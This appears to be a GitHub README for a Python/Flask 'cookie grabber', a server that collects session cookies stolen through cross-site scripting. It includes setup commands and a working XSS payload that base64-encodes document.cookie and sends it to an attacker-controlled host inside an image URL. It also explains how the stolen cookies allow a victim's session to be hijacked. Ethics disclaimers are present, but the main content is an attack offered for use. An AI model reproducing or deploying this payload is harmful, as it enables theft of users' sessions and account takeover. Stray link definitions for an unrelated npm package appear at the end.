# Cookie grabber 
> A simple cookie grabber built with Python and Flask.

![License](https://img.shields.io/badge/license-MIT-blue.svg)  
![Python](https://img.shields.io/badge/python-3.x-green.svg)  
![Flask](https://img.shields.io/badge/flask-2.x-red.svg)

A simple cookie grabber built with Python and Flask. This tool is designed to capture cookies from users who are targeted by an XSS (Cross-Site Scripting) attack.
**This tool is for educational and ethical testing purposes only.**


## Installation

```bash
  git clone https://github.com/0273574/cookie_grabber.git
  cd cookie_grabber

  # Create a virtual environment
  python3 -m venv env
  source env/bin/activate

  #  Install dependencies
  pip install -r requirements.txt
```

## Usage example

When a website has a login functionality and contains a form vulnerable to Cross-Site Scripting (XSS), an attacker can exploit this vulnerability by injecting malicious JavaScript code. For example, the attacker could inject the following script:

```javascript
Copy
<script>
  var img = document.createElement("img");
  img.src = "http://ip.addr.of.grabber:443/grab.php?cookie=" + btoa(document.cookie);
  document.body.appendChild(img);
</script>
```
## How It Works

- The script creates an `<img>` element.
- The `src` attribute of the image is set to a URL controlled by the attacker, which includes the victim's cookies (encoded in Base64) as a query parameter.
- When the browser attempts to load the image, it sends an HTTP request to the attacker's server, exfiltrating the victim's session cookies.
- The attacker can then decode the cookies and potentially hijack the victim's session.

## Ethical Considerations

This tool is designed for educational purposes and ethical security testing only. It should only be used in environments where you have explicit permission to test for vulnerabilities. Unauthorized use of this tool to exploit or harm systems, networks, or individuals is illegal and unethical. The developers and contributors of this project are not responsible for any misuse of this tool.

Always ensure you have proper authorization before using this tool in any environment.

[https://github.com/0273574/](https://github.com/0273574/)

## Contributing

1. Fork it (<https://github.com/0273574/cookie_grabber/fork>)
2. Create your feature branch (`git checkout -b feature/fooBar`)
3. Commit your changes (`git commit -am 'Add some fooBar'`)
4. Push to the branch (`git push origin feature/fooBar`)
5. Create a new Pull Request

Please ensure that any contributions adhere to ethical guidelines and are intended for educational or authorized security testing purposes only.
<!-- Markdown link & img dfn's -->
[npm-image]: https://img.shields.io/npm/v/datadog-metrics.svg?style=flat-square
[npm-url]: https://npmjs.org/package/datadog-metrics
[npm-downloads]: https://img.shields.io/npm/dm/datadog-metrics.svg?style=flat-square
[travis-image]: https://img.shields.io/travis/dbader/node-datadog-metrics/master.svg?style=flat-square
[travis-url]: https://travis-ci.org/dbader/node-datadog-metrics
